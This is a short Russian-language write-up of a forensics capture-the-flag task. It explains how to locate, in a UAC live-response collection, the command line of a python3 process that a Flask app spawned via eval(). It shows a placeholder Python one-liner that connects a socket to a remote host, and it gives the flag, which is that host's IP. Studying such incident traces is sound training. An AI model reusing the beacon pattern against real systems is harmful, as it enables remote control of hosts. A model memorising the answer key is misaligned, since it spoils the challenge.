# Разбор — 01 Обратный маяк

## Где искать

```
live_response/process/proc/4184/cmdline.txt
```

## Почему именно этот файл

UAC снимает содержимое `/proc/<pid>/cmdline` для каждого запущенного процесса.  
В Linux этот файл содержит полную командную строку процесса — имя программы и все аргументы, разделённые нулевым байтом (`\0`). UAC заменяет `\0` переводом строки.

PID 4184 — это процесс `python3`, порождённый Flask-приложением (PID 1) через `eval()`. Его командная строка — Python-однострочник, который открывает TCP-сокет и соединяется с удалённым хостом.

## Как извлечь ответ

Открой файл. Содержимое будет выглядеть примерно так:

```
python3
import socket,...; s=socket.socket(...); s.connect(('X.X.X.X', PPPP)); ...
```

Первый аргумент `socket.connect()` — кортеж `(ip, port)`.  
Возьми IP-адрес (первый элемент кортежа). Это и есть значение флага.

## Ответ

```
RCPISS{45.80.69.192}
```
